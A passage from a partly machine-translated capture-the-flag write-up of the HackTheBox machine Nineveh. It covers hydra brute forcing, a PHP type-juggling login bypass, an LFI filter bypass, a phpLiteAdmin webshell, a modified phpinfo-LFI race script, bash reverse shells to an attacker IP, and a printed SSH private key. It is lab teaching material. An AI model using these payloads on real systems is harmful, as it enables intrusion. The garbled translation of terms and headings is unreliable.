 LFI  hydra密码破解 phplitecms  RCE 
ssh泄露 隐写图片 pspy chkrootkit



# 高温透射电：尼尼微

[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnineveh-cover.png) 

关于尼尼微的几个部分不符合我在现代HTB机器中的期望 - steg，暴力破解密码和端口敲击。尽管如此，还是有一些非常巧妙的攻击。我将展示两种获取外壳的方法，通过 phpLiteAdmin 编写一个网络外壳，以及通过滥用 PHPinfo。从那里，我将使用我的shell读取敲门配置和端口敲门声以打开SSH并使用我从steg映像中获得的密钥对获得访问权限。为了获得根，我将利用 chkroot，它在 cron 上运行。

## 箱子信息

名字

[尼尼微](https://www.hackthebox.eu/home/machines/profile/54) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-nineveh.png) 

发行日期

04 8月 2017

停用日期

16 12月 2017

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

中等 \[30\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnineveh-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnineveh-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 05小时 30分钟 26秒。[![阿坎托洛](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F1183)](https://www.hackthebox.eu/home/users/profile/1183)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 05小时 51分钟 16秒。[![阿坎托洛](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F1183)](https://www.hackthebox.eu/home/users/profile/1183)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F596)](https://www.hackthebox.eu/home/users/profile/596)-

### n地图

`nmap`仅显示打开的 HTTP （TCP 80） 和 HTTPS （TCP 443）：

    root@kali# nmap -p- --min-rate 10000 --oA scans/nmap-alltcp 10.10.10.43
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 20:19 EDT
    Nmap scan report for 10.10.10.43
    Host is up (0.014s latency).
    Not shown: 65533 filtered ports
    PORT    STATE SERVICE
    80/tcp  open  http
    443/tcp open  https
    
    Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
    root@kali# nmap -p 80,443 -sV -sC --oA scans/nmap-tcpscripts 10.10.10.43
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 20:21 EDT
    Nmap scan report for 10.10.10.43
    Host is up (0.013s latency).
    
    PORT    STATE SERVICE  VERSION
    80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
    | Not valid before: 2017-07-01T15:03:30
    |_Not valid after:  2018-07-01T15:03:30
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  http/1.1
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds
    

### vhost Brute Force

There’s a hostname in the certificate, in the scan, . I want to check for subdomains that might be different. I’ll run and fuzz the HTTP header. With , I’ll always start it without the hiding flag, see what the default response looks like, and then Ctrl-c to kill it, and re-run with a flag to hide the default response. For the HTTP site ( is hide by character length) worked, and on the HTTPS site. Neither returned anything:`nmap``nineveh.htb``wfuzz``Host``wfuzz``--hh 178``--hh``--hh 49`

    root@kali# wfuzz -c -u http://10.10.10.43/ -H "Host: FUZZ.nineveh.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 178
    
    ********************************************************
    * Wfuzz 2.4.5 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://10.10.10.43/
    Total requests: 100000
    
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload
    ===================================================================
    
    
    Total time: 206.0595
    Processed Requests: 100000
    Filtered Requests: 100000
    Requests/sec.: 485.2965
    

### Website - TCP 80

#### Site

The site just displays a simple success page with no further information:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411052716506.png) 

This is the same visiting by IP address or .`nineveh.htb`

#### Directory Brute Force

I also started a to see what other paths may exist. I’ll include because it’s Linux and that’s always worth guessing, even though didn’t load manually in Firefox. This found two interesting paths:`gobuster``-x php``index.php`

    root@kali# gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -o scans/gobuster-http-root-medium -t 20
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.43
    [+] Threads:        20
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     php
    [+] Timeout:        10s
    ===============================================================
    2020/04/11 05:28:16 Starting gobuster
    ===============================================================
    /info.php (Status: 200)
    /department (Status: 301)
    /server-status (Status: 403)
    ===============================================================
    2020/04/11 05:31:10 Finished
    ===============================================================
    

#### /信息.php

此页面显示 PHP 信息页面：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411055526179.png) 

#### /部门

该网站提供登录表单：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411052327387.png) 

我尝试了一些基本的密码猜测，并注意到错误消息指示用户是否存在。例如，当我尝试管理员时：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411052553834.png) 

When I tried nineveh:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411052620519.png) 

### 网站 - TCP 443

#### 网站

此站点仅返回一个图像：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411052935379.png) 

这与通过 IP 地址或 访问相同。`nineveh.htb`

#### 目录暴力破解

在此处运行还会返回三个路径：`gobuster`

    root@kali# gobuster dir -k -u https://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o scans/gobuster-https-root-medium -t 20
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            https://10.10.10.43
    [+] Threads:        20
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Timeout:        10s
    ===============================================================
    2020/04/11 05:10:49 Starting gobuster
    ===============================================================
    /db (Status: 301)
    /server-status (Status: 403)
    /secure_notes (Status: 301)
    ===============================================================
    2020/04/11 05:13:54 Finished
    ===============================================================
    

#### /数据库

`/db`返回一个登录名的实例：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411053200602.png) 

[中文版](https://www.phpliteadmin.org/)是一个用于与 SQLite 数据库交互的 PHP 接口。

它是1.9版本，它显示了以下漏洞：`searchsploit`

    root@kali# searchsploit phpliteadmin
    ---------------------------------------------------------------- ----------------------------------------
     Exploit Title                                                  |  Path
                                                                    | (/usr/share/exploitdb/)
    ---------------------------------------------------------------- ----------------------------------------
    PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                  | exploits/php/webapps/24044.txt
    phpLiteAdmin - 'table' SQL Injection                            | exploits/php/webapps/38228.txt
    phpLiteAdmin 1.1 - Multiple Vulnerabilities                     | exploits/php/webapps/37515.txt
    phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                   | exploits/php/webapps/39714.txt
    ---------------------------------------------------------------- ----------------------------------------
    Shellcodes: No Result
    

用 检查其中的每一个，第一个是版本匹配，似乎是获得执行的好方法。第二个看起来也应该工作，如果我想做SQLi。第三个不是版本匹配，第四个有一堆不太有趣的漏洞，如XSS和CSRF。对于所有这些，我需要首先进行身份验证。`searchsploit -x [path]`

#### /secure\_notes

此页面只是一个图像：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnineveh.png) 

## Shell as www-data （通过 phpLiteAdmin）

### 中文精英暴力破解

现代HTB不需要在没有明确指示的情况下对密码进行暴力破解。尼尼微一定是在那个时候之前。鉴于我只有一个密码字段，并且可能存在代码执行漏洞，我从使用 phpLiteadmin 开始使用 。对于网络暴力破解，我想从一个较小的密码列表开始。[保密者](https://github.com/danielmiessler/SecLists)（）有一个似乎是一个合理的起点：`hydra``apt install seclists``twitter-banned.txt`

    root@kali# wc -l /usr/share/seclists/Passwords/twitter-banned.txt
    397 /usr/share/seclists/Passwords/twitter-banned.txt
    

我将使用以下选项运行：`hydra`

*   `-l 0xdf` - `hydra`需要用户名，即使它不会使用它
*   `-P [password file]`\- 要尝试的密码文件
*   `https-post-form`\- 这是要使用的插件，它采用一个包含三个部分的字符串，分开：`:`
    *   `/db/index.php`\- 开机自检路径
    *   `password=^PASS^&remember=yes&login=Log+In&proc_login=true`\- POST数据，将被单词列表中的单词替换`^PASS^`
    *   `Incorrect password`\- 响应上指示登录失败的文本

它很快就能找到密码：

    root@kali# hydra 10.10.10.43 -l 0xdf -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
    Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
    
    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-11 06:03:28
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 397 login tries (l:1/p:397), ~25 tries per task
    [DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password
    [443][http-post-form] host: 10.10.10.43   login: 0xdf   password: password123
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-11 06:03:36
    

### Enumerate phpLiteAdmin

使用密码，我可以登录：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411060847374.png) 

只有一个数据库 ，它没有表。`test`

### 断续器注入

来自 的漏洞描述了如何使用以下步骤利用 phpLite管理员获取 RCE：`24044.txt``searchsploit`

1.  创建一个以 结尾的新数据库：`.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411061223961.png) 

1.  我将单击新的数据库以切换到它，并创建一个包含1个文本字段的表，其默认值为基本PHP webshell：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411061614183.png) 

请注意，在PHP中使用它很重要，就像数据库用来定义整个字符串一样：`"``'`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411061634696.png) 

1.  查看页面。

不幸的是，我被困在这里。我可以在以下位置看到新网络外壳的路径：`.php``/var/tmp`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411061953672.png) 

但是我缺乏在浏览器中访问该页面所需的LFI。

### /部门类型混淆

鉴于我已经能够识别管理员的用户名，我也可以尝试在这里暴力破解密码（并且它将与足够大的列表一起使用，例如）。但在这样做之前，我通过将POST数据作为数组发送来检查PHP类型杂耍错误。当我从火狐提交表单时，打嗝将 POST 数据显示为：`rockyou.txt``password`

    username=admin&password=admin
    

如果我将其更改为：

    username=admin&password[]=
    

它让我进入：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411062649071.png) 

为什么会这样？PHP在处理不同类型数据的比较方面很慷慨。因此，如果PHP正在对数据库中的密码（或像这里的情况一样进行硬编码）和用户输入进行字符串比较，它可能看起来像这样：

    if(strcmp($_REQUEST['password'], $password) == 0)
    

`strcmp`返回两个字符串不同的地方，正如我在交互式PHP终端中看到的那样（运行）：`php -a`

    php > strcmp("admin", "0xdf");
    php > echo strcmp("admin", "0xdf");
    1
    php > echo strcmp("admin", "admin0xdf");
    -4
    php > echo strcmp("admin", "admin");
    0
    

如果我将数组作为字符串之一传入，PHP 将失败：

    php > echo strcmp(array(), "admin");
    PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
    

但是，它实际上返回一个 NULL，如果将该 NULL 与 0 进行比较，则计算结果为 true：

    php > if (strcmp(array(), "admin") == 0) { echo "oops"; }
    PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
    oops
    

### 枚举管理.php

登录时，我被重定向到 ，如上所示。除了仅显示正在构建的图像的主页按钮外，还有一个Notes按钮，它只是添加到同一PHP页面并在图像下显示此文本：`manage.php``?notes=files/ninevehNotes.txt`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411063735004.png) 

带有硬编码用户名和密码的登录页面可能是我绕过的类型混淆。机密文件夹引用很有趣。我回过头来谈这个问题。db接口是我已经利用的东西。

### 断续器

每当我看到一个似乎给出文件路径作为参数的URL时，我都想戳它以包含本地文件（特别是现在，因为这是我需要获得RCE的）。

我尝试了一些事情来感受正在发生的事情：

注释参数

错误信息

`ninevehNotes.txt`

无错误，显示注释

`/etc/passwd`

未选择“注释”。

`../../../../../../../../../../etc/passwd`

未选择“注释”。

`ninevehNotes`

警告：包含（文件/九veh注释）：无法打开流：在第31行.php/var/www/html/部门/管理中没有这样的文件或目录

`ninevehNote`

No Note is selected.

`files/ninevehNotes/../../../../../../../../../etc/passwd`

文件名太长。

`files/ninevehNotes/../../../../../../../etc/passwd`

内容`/etc/passwd`

`/ninevehNotes/../etc/passwd`

内容`/etc/passwd`

它花了一分钟才意识到，但它似乎正在检查该短语是否在参数中，或者它只是显示“未选择任何注释”。但是有一些方法可以解决这个问题，要么只是删除扩展名并转到目录，要么从 开始，然后进入不存在的文件夹，然后立即退出。该系统足够好，可以取消这两个，同时允许PHP通过字符串检查。`ninevehNotes``/``ninevehNotes``../`

### 断续器

现在，我可以访问我之前留下的网页外壳`http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/0xdf.php&cmd=id`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411065028130.png) 

### 壳

要获得 shell，我只需将 更改为 （对 进行 url 编码非常重要，否则它们将被解释为启动新参数）。我在 ：`cmd``bash -c 'bash -i >%26 /dev/tcp/10.10.14.24/443 0>%261'``&``nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.43.
    Ncat: Connection from 10.10.10.43:40460.
    bash: cannot set terminal process group (1387): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@nineveh:/var/www/html/department$ 
    

蟒蛇2不在尼尼微上，但蟒蛇3是：

    www-data@nineveh:/var/www/html/department$ python -c 'import pty;pty.spawn("bash")'
    The program 'python' can be found in the following packages:
     * python-minimal
     * python3
    Ask your administrator to install one of them
    www-data@nineveh:/var/www/html/department$ python3 -c 'import pty;pty.spawn("bash")'
    

我将按 Ctrl-z， ， 来获取一个功能齐全的外壳。`stty raw -echo``fg``reset`

作为 www 数据，我可以在 中看到，但我无法阅读它。`user.txt``/home/amrois`

## 壳牌作为 www-data （通过.php）

### 背景

我记得在他的[毒药视频](https://youtu.be/rs4zEwONzzk?t=601)中看到Ippsec利用了这种技术。失眠安全在2011年有一[篇非常整洁的论文](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)，关于LFI + PHPINFO = RCE。首先，PHP 必须使用 配置 。幸运的是，这里的情况就是这样：`file_uploads = on`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411070402024.png) 

这意味着任何 PHP 请求都将接受上传的文件，这些文件被存储到一个临时位置，直到 PHP 请求得到完全处理，然后它们将被丢弃。PHPINFO足以列出这些文件。我可以通过捕获Burp Proxy中的请求并将其修改为具有如下虚拟文件的POST请求来显示这一点：`/info.php`

    POST /info.php HTTP/1.1
    Host: 10.10.10.43
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: PHPSESSID=ehjpe8sp040ma068aen884obr7
    Upgrade-Insecure-Requests: 1
    Content-Length: 194
    Content-Type: multipart/form-data; boundary=---------------------------7db268605ae
    
    -----------------------------7db268605ae
    Content-Disposition: form-data; name="dummyname"; filename="test.txt" Content-Type: text/plainSecurity
    Test
    -----------------------------7db268605ae
    

我更改为 ，添加了标头和 POST 正文。`GET``POST``Content-Type`

生成的页面包括以下内容：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200411073056237.png) 

这包括存储此文件的文件名！

该文件仅存在几分之一秒，但有时我可以赢得比赛并在页面消失之前访问该页面。失眠在HTTP标头中放入了大量填充，以增加处理时间，从而增加攻击者赢得比赛的机会。

### 脚本修改

失眠提供了[一个Python脚本](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)来利用这一点。我会下载它，但它需要一些编辑才能让它在这种情况下工作。

首先，我将收集一些我需要的变量：

    local_ip = "10.10.14.24"
    local_port = 443
    phpsessid = "ehjpe8sp040ma068aen884obr7"
    

需要指向有效的会话。如果我从头开始重写它，我会让脚本登录并以这种方式获取会话ID，但是这里发生了太多的事情，我现在不想搞砸。`PHPSESSID`

现在，我将更改顶部函数中的一堆内容：`setup`

    def setup(host, port):
        TAG="Security Test"
        PAYLOAD="""%s\r <?php system("bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'");?>\r""" % (TAG, local_ip, local_port)
        REQ1_DATA="""-----------------------------7dbff1ded0714\r
    Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
    Content-Type: text/plain\r
    \r
    %s
    -----------------------------7dbff1ded0714--\r""" % PAYLOAD
        padding="A" * 5000
        REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
    Cookie: PHPSESS" + phpsessid + """; othercookie="""+padding+"""\r
    HTTP_ACCEPT: """ + padding + """\r
    HTTP_USER_AGENT: """+padding+"""\r
    HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
    HTTP_PRAGMA: """+padding+"""\r
    Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
    Content-Length: %s\r
    Host: %s\r
    \r
    %s""" %(len(REQ1_DATA),host,REQ1_DATA)
        #modify this to suit the LFI script   
        LFIREQ="""GET /department/manage.php?notes=/ninevehNotes/..%s HTTP/1.1\r
    User-Agent: Mozilla/4.0\r
    Proxy-Connection: Keep-Alive\r
    Cookie: PHPSESS" + phpsessid + """\r
    Host: %s\r
    \r
    \r
    """
        return (REQ1, TAG, LFIREQ)
    

我做了以下更改：

*   更改了有效负载，以便它将反向外壳返回到上面指定的 ip 和端口。
*   将 POST 路径更改为与尼尼微匹配，而不是匹配。`REQ1``/info.php``/phpinfo.php`
*   已将开机自检路径更改为尼尼微 LFI。`LFIREQ`
*   向 添加了一个饼干，以便我可以访问 LFI。`PHPSESSID``LFIREQ`

我必须更改的另一件事是代码中的两个位置，它在响应中查找。PHP 现在 HTML 将其编码为 ，所以我需要修复它。有趣的是，在论文中，它也有编码版本，所以它可能只是脚本中的错误。`[tmp_name] =>``[tmp_name] =&gt;`

### 壳

完成这些更改后，我可以在侦听器等待的情况下运行脚本：`nc`

    root@kali# python phpinfolfi.py 10.10.10.43 80 100
    LFI With PHPInfo()
    -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    Getting initial offset... found [tmp_name] at 125163
    Spawning worker pool (100)...
     101 /  1000
    

它在那个点上冻结了，壳在：`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.43.
    Ncat: Connection from 10.10.10.43:43916.
    bash: cannot set terminal process group (1387): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@nineveh:/var/www/html/department$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

## Priv： www-data –> 阿姆罗伊

### 列举

在这个盒子上没有太多可找的东西，我又回到了我已经拥有的线索，特别是刚刚输出图像的目录，以及登录页面中的注释，上面写着要检查秘密文件夹以进入，这是一个挑战。`/secure_notes`

该目录只包含 和 ：`/secure_notes``.png``index.html`

    www-data@nineveh:/var/www/ssl/secure_notes$ ls
    index.html  nineveh.png
    

当CTF将您带到一个地方，然后您找到的只是一个图像时，值得对其进行更多检查。跑步验证了倾斜度：`strings`

    www-data@nineveh:/var/www/ssl/secure_notes$ strings -n 20 nineveh.png 
    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
    H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
    PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
    FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
    3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
    X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
    KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
    FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
    GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
    JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
    9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
    Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
    ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
    1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
    vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
    DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
    P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
    fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
    tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
    iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
    MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
    PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
    i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
    il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
    fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
    -----END RSA PRIVATE KEY-----
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
    

### 拉开斯泰格

为了对此进行更多的检查，我将转到Firefox并将此图像下载到我的本地计算机。运行显示存档已附加到文件末尾：`binwalk``tar`

    root@kali# binwalk nineveh.png 
    
    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
    84            0x54            Zlib compressed data, best compression
    2881744       0x2BF8D0        POSIX tar archive (GNU)
    

我可以用来提取所有文件，它甚至会解压缩存档：`-e`

    root@kali# binwalk -e nineveh.png 
    
    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
    84            0x54            Zlib compressed data, best compression
    2881744       0x2BF8D0        POSIX tar archive (GNU)
    
    root@kali# find _nineveh.png.extracted/
    _nineveh.png.extracted/
    _nineveh.png.extracted/54
    _nineveh.png.extracted/2BF8D0.tar
    _nineveh.png.extracted/54.zlib
    _nineveh.png.extracted/secret
    _nineveh.png.extracted/secret/nineveh.priv
    _nineveh.png.extracted/secret/nineveh.pub
    

私钥看起来正常：

    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
    H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
    PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
    FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
    3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
    X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
    KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
    FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
    GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
    JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
    9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
    Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
    ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
    1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
    vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
    DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
